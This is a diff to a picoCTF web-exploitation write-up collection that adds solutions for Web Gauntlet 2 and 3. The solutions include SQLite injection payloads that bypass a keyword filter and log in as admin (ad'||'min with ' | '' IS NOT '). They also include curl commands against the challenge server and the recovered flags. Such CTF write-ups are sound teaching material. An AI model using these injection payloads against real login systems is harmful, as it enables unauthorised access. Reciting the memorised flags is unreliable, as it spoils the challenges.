@@ -29,10 +29,10 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 - [Super Serial (2021)](#super-serial) ✓
 - [Most Cookies (2021)](#most-cookies) ✓
 - [Some Assembly Required 3 (2021)](#some-assembly-required-3) ✓
-- [Web Gauntlet 2 (2021)](#web-gauntlet-2)
+- [Web Gauntlet 2 (2021)](#web-gauntlet-2) ✓
 - [Some Assembly Required 4 (2021)](#some-assembly-required-4)
 - [X marks the spot (2021)](#x-marks-the-spot)
-- [Web Gauntlet 3 (2021)](#web-gauntlet-3)
+- [Web Gauntlet 3 (2021)](#web-gauntlet-3) ✓
 - [Bithug (2021)](#bithug)
 - [login (2021)](#login) ✓
 - [caas (2021)](#caas)
@@ -4600,6 +4600,75 @@ This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:
 
 <summary markdown="span">Solution 1</summary>
 
+This is another SQL injection challenge using [SQLite](https://portswigger.net/web-security/sql-injection/cheat-sheet).  Two URLs are provided, the admin site and the filter site.
+
+1. index.php:
+	
+~~~html
+<!DOCTYPE html>
+<html>
+<head>
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<link href="style.css" rel="stylesheet">
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</head>
+	<body>
+		<div class="container">
+			<div class="row">
+				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
+					<div class="card card-signin my-5">
+						<div class="card-body">
+							<h5 class="card-title text-center">Filtered SQLite Injection Challenge #2</h5>
+														<form class="form-signin" action="index.php" method="post">
+								<div class="form-label-group">
+									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
+									<label for="user">Username</label>
+								</div>
+
+								<div class="form-label-group">
+									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
+									<label for="pass">Password</label>
+								</div>
+
+								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
+~~~
+
+2. filter.php:
+
+~~~html
+Filters: or and true false union like = > < ; -- /* */ admin<br/>
+~~~
+	
+We are limited by the filter and must concatenate the username as in Web Gauntlet. ad'||'min will work for the username, we can enter password in the password field however the OR in password is filtered, lets try password = passwo'||'rd. The SQL query will now appear:
+
+~~~sql
+SELECT username, password FROM users WHERE username='ad'||'min' AND password='passwo'||'rd'
+~~~
+
+To get around the password, we can use an OR logic operator symbol: ' | '' IS NOT ':
+
+~~~shell
+$ curl --data "user=ad'||'min" --data "pass=' | '' IS NOT '" http://mercury.picoctf.net:21336/index.php --cookie "PHPSESSID=1"
+~~~
+
+We should now be able to retrieve the flag from filter.php:
+
+~~~shell
+$ curl mercury.picoctf.net:21336/filter.php --cookie "PHPSESSID=1" | grep -o -P '(?<=picoCTF{).*(?=})'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4902    0  4902    0     0  12073      0 --:--:-- --:--:-- --:--:-- 12044
+0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585
+~~~
+	
 </details>
 
 ### Answer
@@ -4609,7 +4678,7 @@ This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}
 ~~~
 
 </details>
@@ -4719,6 +4788,29 @@ Last time, I promise! Only 25 characters this time. Log in as admin Site: http:/
 
 <summary markdown="span">Solution 1</summary>
 
+This challenge is a continuation of the Web Gauntlet challenges and uses SQLite. The following filters are used on the form:
+
+~~~php
+Filters: or and true false union like = > < ; -- /* */ admin
+~~~
+
+Using the same login as the previous challenge (username = ad'||'min, password = test) we get the SQL query:
+	
+~~~sql
+SELECT username, password FROM users WHERE username='ad'||'min' AND password='test' 
+~~~
+
+With the passowrd=a' IS NOT b', we get the flag at filter.php:
+
+~~~shell
+$ curl --data "user=ad'||'min" --data "pass=' | '' IS NOT '" http://mercury.picoctf.net:28715/index.php --cookie "PHPSESSID=1111"
+$ curl mercury.picoctf.net:28715/filter.php --cookie "PHPSESSID=1111" | grep -o -P '(?<=picoCTF{).*(?=})'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4902    0  4902    0     0  11927      0 --:--:-- --:--:-- --:--:-- 11927
+k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb
+~~~
+	
 </details>
 
 ### Answer
@@ -4728,7 +4820,7 @@ Last time, I promise! Only 25 characters this time. Log in as admin Site: http:/
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}
 ~~~
 
 </details>
